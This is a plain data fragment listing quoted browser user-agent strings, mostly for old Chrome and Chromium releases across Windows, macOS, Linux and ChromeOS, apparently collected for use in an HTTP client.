"Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.66 Safari/535.11",
"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.66 Safari/535.11",
"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.66 Safari/535.11",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.66 Safari/535.11",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_2) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.66 Safari/535.11",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.66 Safari/535.11",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_5_8) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.66 Safari/535.11",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.11 (KHTML, like Gecko) Ubuntu/11.10 Chromium/17.0.963.65 Chrome/17.0.963.65 Safari/535.11",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.11 (KHTML, like Gecko) Ubuntu/11.04 Chromium/17.0.963.65 Chrome/17.0.963.65 Safari/535.11",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.11 (KHTML, like Gecko) Ubuntu/10.10 Chromium/17.0.963.65 Chrome/17.0.963.65 Safari/535.11",
"Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.11 (KHTML, like Gecko) Ubuntu/11.10 Chromium/17.0.963.65 Chrome/17.0.963.65 Safari/535.11",
"Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.65 Safari/535.11",
"Mozilla/5.0 (X11; FreeBSD amd64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.65 Safari/535.11",
"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.65 Safari/535.11",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_2) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.65 Safari/535.11",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.65 Safari/535.11",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_4) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.65 Safari/535.11",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.11 (KHTML, like Gecko) Ubuntu/11.04 Chromium/17.0.963.56 Chrome/17.0.963.56 Safari/535.11",
"Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11",
"Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.12 Safari/535.11",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.8 (KHTML, like Gecko) Chrome/17.0.940.0 Safari/535.8",
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.77 Safari/535.7ad-imcjapan-syosyaman-xkgi3lqg03!wgz",
"Mozilla/5.0 (X11; CrOS i686 1193.158.0) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.75 Safari/535.7",
"Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.75 Safari/535.7",
"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.75 Safari/535.7",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.63 Safari/535.7xs5D9rRDFpg2g",
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.8 (KHTML, like Gecko) Chrome/16.0.912.63 Safari/535.8",
"Mozilla/5.0 (Windows NT 5.2; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.63 Safari/535.7",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7",
"Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7",
"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.6 (KHTML, like Gecko) Chrome/16.0.897.0 Safari/535.6",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.54 Safari/535.2",
"Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.121 Safari/535.2",
"Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.2 (KHTML, like Gecko) Ubuntu/11.10 Chromium/15.0.874.120 Chrome/15.0.874.120 Safari/535.2",
"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2",
"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.872.0 Safari/535.2",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.2 (KHTML, like Gecko) Ubuntu/11.04 Chromium/15.0.871.0 Chrome/15.0.871.0 Safari/535.2",
"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.864.0 Safari/535.2",
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.861.0 Safari/535.2",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.861.0 Safari/535.2",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.861.0 Safari/535.2",
"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.860.0 Safari/535.2",
"Chrome/15.0.860.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/15.0.860.0",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_2) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.835.186 Safari/535.1",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_2) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.834.0 Safari/535.1",
"Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.1 (KHTML, like Gecko) Ubuntu/11.04 Chromium/14.0.825.0 Chrome/14.0.825.0 Safari/535.1",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.824.0 Safari/535.1",
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.815.10913 Safari/535.1",
"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.815.0 Safari/535.1",
"Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.1 (KHTML, like Gecko) Ubuntu/11.04 Chromium/14.0.814.0 Chrome/14.0.814.0 Safari/535.1",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.814.0 Safari/535.1",
"Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.1 (KHTML, like Gecko) Ubuntu/10.04 Chromium/14.0.813.0 Chrome/14.0.813.0 Safari/535.1",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.813.0 Safari/535.1",
"Mozilla/5.0 (Windows NT 5.2) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.813.0 Safari/535.1",
"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.813.0 Safari/535.1",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_7) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.813.0 Safari/535.1",
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.812.0 Safari/535.1",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.811.0 Safari/535.1",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.810.0 Safari/535.1",
"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.810.0 Safari/535.1",
"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.809.0 Safari/535.1",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.1 (KHTML, like Gecko) Ubuntu/10.10 Chromium/14.0.808.0 Chrome/14.0.808.0 Safari/535.1",
"Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.1 (KHTML, like Gecko) Ubuntu/10.04 Chromium/14.0.808.0 Chrome/14.0.808.0 Safari/535.1",
"Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.1 (KHTML, like Gecko) Ubuntu/10.04 Chromium/14.0.804.0 Chrome/14.0.804.0 Safari/535.1",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.803.0 Safari/535.1",
"Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.1 (KHTML, like Gecko) Ubuntu/11.04 Chromium/14.0.803.0 Chrome/14.0.803.0 Safari/535.1",
"Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.803.0 Safari/535.1",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.803.0 Safari/535.1",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_7) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.803.0 Safari/535.1",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_5_8) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.803.0 Safari/535.1",
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.801.0 Safari/535.1",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_5_8) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.801.0 Safari/535.1",
"Mozilla/5.0 (Windows NT 5.2) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.794.0 Safari/535.1",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.794.0 Safari/535.1",
"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.792.0 Safari/535.1",
"Mozilla/5.0 (Windows NT 5.2) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.792.0 Safari/535.1",
"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.792.0 Safari/535.1",
"Mozilla/5.0 (Macintosh; PPC Mac OS X 10_6_7) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.790.0 Safari/535.1",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_7) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.790.0 Safari/535.1",
"Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/526.3 (KHTML, like Gecko) Chrome/14.0.564.21 Safari/526.3",
"Mozilla/5.0 (X11; CrOS i686 13.587.48) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.43 Safari/535.1",
"Mozilla/5.0 Slackware/13.37 (X11; U; Linux x86_64; en-US) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41",
"Mozilla/5.0 ArchLinux (X11; Linux x86_64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41 Safari/535.1",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.1 (KHTML, like Gecko) Ubuntu/11.04 Chromium/13.0.782.41 Chrome/13.0.782.41 Safari/535.1",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41 Safari/535.1",
"Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41 Safari/535.1",
"Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41 Safari/535.1",
"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41 Safari/535.1",
"Mozilla/5.0 (Windows NT 5.2; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41 Safari/535.1",
"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41 Safari/535.1",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_7) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41 Safari/535.1",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_3) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41 Safari/535.1",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_2) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41 Safari/535.1",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_3) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.32 Safari/535.1",
"Mozilla/5.0 (X11; Linux amd64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.220 Safari/535.1",
"Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.220 Safari/535.1",
"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.220 Safari/535.1",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.215 Safari/535.1",
"Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.215 Safari/535.1",
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.215 Safari/535.1",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_2) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.215 Safari/535.1",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.20 Safari/535.1",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.20 Safari/535.1",
"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.20 Safari/535.1",
"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.20 Safari/535.1",
"Mozilla/5.0 (X11; CrOS i686 0.13.587) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.14 Safari/535.1",
"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.107 Safari/535.1",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_2) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.107 Safari/535.1",
"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.1 Safari/535.1",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.36 (KHTML, like Gecko) Chrome/13.0.766.0 Safari/534.36",
"Mozilla/5.0 (X11; Linux amd64) AppleWebKit/534.36 (KHTML, like Gecko) Chrome/13.0.766.0 Safari/534.36",
"Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.35 (KHTML, like Gecko) Ubuntu/10.10 Chromium/13.0.764.0 Chrome/13.0.764.0 Safari/534.35",
"Mozilla/5.0 (X11; CrOS i686 0.13.507) AppleWebKit/534.35 (KHTML, like Gecko) Chrome/13.0.763.0 Safari/534.35",
"Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.33 (KHTML, like Gecko) Ubuntu/9.10 Chromium/13.0.752.0 Chrome/13.0.752.0 Safari/534.33",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_5_8) AppleWebKit/534.31 (KHTML, like Gecko) Chrome/13.0.748.0 Safari/534.31",
"Mozilla/5.0 (Windows NT 6.1; en-US) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.750.0 Safari/534.30",
"Mozilla/5.0 (X11; CrOS i686 12.433.109) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.93 Safari/534.30",
"Mozilla/5.0 (X11; CrOS i686 12.0.742.91) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.93 Safari/534.30",
"Mozilla/5.0 Slackware/13.37 (X11; U; Linux x86_64; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/12.0.742.91",
"Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.91 Chromium/12.0.742.91 Safari/534.30",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.68 Safari/534.30",
"Mozilla/5.0 ArchLinux (X11; U; Linux x86_64; en-US) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.60 Safari/534.30",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.53 Safari/534.30",
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.113 Safari/534.30",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.30 (KHTML, like Gecko) Ubuntu/11.04 Chromium/12.0.742.112 Chrome/12.0.742.112 Safari/534.30",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.30 (KHTML, like Gecko) Ubuntu/10.10 Chromium/12.0.742.112 Chrome/12.0.742.112 Safari/534.30",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.30 (KHTML, like Gecko) Ubuntu/10.04 Chromium/12.0.742.112 Chrome/12.0.742.112 Safari/534.30",
"Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.30 (KHTML, like Gecko) Ubuntu/11.04 Chromium/12.0.742.112 Chrome/12.0.742.112 Safari/534.30",
"Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.30 (KHTML, like Gecko) Ubuntu/10.10 Chromium/12.0.742.112 Chrome/12.0.742.112 Safari/534.30",
"Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.30 (KHTML, like Gecko) Ubuntu/10.04 Chromium/12.0.742.112 Chrome/12.0.742.112 Safari/534.30",
"Mozilla/5.0 (Windows NT 7.1) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.112 Safari/534.30",
"Mozilla/5.0 (Windows NT 5.2) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.112 Safari/534.30",
"Mozilla/5.0 (Windows 8) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.112 Safari/534.30",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_6) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.112 Safari/534.30",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_4) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.112 Safari/534.30",
"Mozilla/5.0 (X11; CrOS i686 12.433.216) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.105 Safari/534.30",
"Mozilla/5.0 ArchLinux (X11; U; Linux x86_64; en-US) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.100 Safari/534.30",
"Mozilla/5.0 ArchLinux (X11; U; Linux x86_64; en-US) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.100",
"Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.30 (KHTML, like Gecko) Slackware/Chrome/12.0.742.100 Safari/534.30",
"Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.100 Safari/534.30",
"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.100 Safari/534.30",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.100 Safari/534.30",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_4) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.100 Safari/534.30",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.724.100 Safari/534.30",
"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/534.25 (KHTML, like Gecko) Chrome/12.0.706.0 Safari/534.25",
"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/534.25 (KHTML, like Gecko) Chrome/12.0.704.0 Safari/534.25",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Ubuntu/10.10 Chromium/12.0.703.0 Chrome/12.0.703.0 Safari/534.24",
"Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.24 (KHTML, like Gecko) Ubuntu/10.10 Chromium/12.0.702.0 Chrome/12.0.702.0 Safari/534.24",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/12.0.702.0 Safari/534.24",
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/12.0.702.0 Safari/534.24",
"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.700.3 Safari/534.24",
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.699.0 Safari/534.24",
"Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.699.0 Safari/534.24",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_6) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.698.0 Safari/534.24",
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.697.0 Safari/534.24",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.71 Safari/534.24",
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.68 Safari/534.24",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_7) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.68 Safari/534.24",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_5_8) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.68 Safari/534.24",
"Mozilla/5.0 Slackware/13.37 (X11; U; Linux x86_64; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/11.0.696.50",
"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.43 Safari/534.24",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.34 Safari/534.24",
"Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.34 Safari/534.24",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24",
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24",
"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24",
"Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.14 Safari/534.24",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.12 Safari/534.24",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_6) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.12 Safari/534.24",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Ubuntu/10.04 Chromium/11.0.696.0 Chrome/11.0.696.0 Safari/534.24",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.0 Safari/534.24",
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.694.0 Safari/534.24",
"Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.23 (KHTML, like Gecko) Chrome/11.0.686.3 Safari/534.23",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.21 (KHTML, like Gecko) Chrome/11.0.682.0 Safari/534.21",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.21 (KHTML, like Gecko) Chrome/11.0.678.0 Safari/534.21",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_7_0; en-US) AppleWebKit/534.21 (KHTML, like Gecko) Chrome/11.0.678.0 Safari/534.21",
"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/534.20 (KHTML, like Gecko) Chrome/11.0.672.2 Safari/534.20",
"Mozilla/5.0 (Windows NT) AppleWebKit/534.20 (KHTML, like Gecko) Chrome/11.0.672.2 Safari/534.20",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_6; en-US) AppleWebKit/534.20 (KHTML, like Gecko) Chrome/11.0.672.2 Safari/534.20",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.20 (KHTML, like Gecko) Chrome/11.0.669.0 Safari/534.20",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.19 (KHTML, like Gecko) Chrome/11.0.661.0 Safari/534.19",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.18 (KHTML, like Gecko) Chrome/11.0.661.0 Safari/534.18",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_6; en-US) AppleWebKit/534.18 (KHTML, like Gecko) Chrome/11.0.660.0 Safari/534.18",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.17 (KHTML, like Gecko) Chrome/11.0.655.0 Safari/534.17",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_4; en-US) AppleWebKit/534.17 (KHTML, like Gecko) Chrome/11.0.655.0 Safari/534.17",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.17 (KHTML, like Gecko) Chrome/11.0.654.0 Safari/534.17",
"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/534.17 (KHTML, like Gecko) Chrome/11.0.652.0 Safari/534.17",
"Mozilla/4.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/11.0.1245.0 Safari/537.36",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.17 (KHTML, like Gecko) Chrome/10.0.649.0 Safari/534.17",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; de-DE) AppleWebKit/534.17 (KHTML, like Gecko) Chrome/10.0.649.0 Safari/534.17",
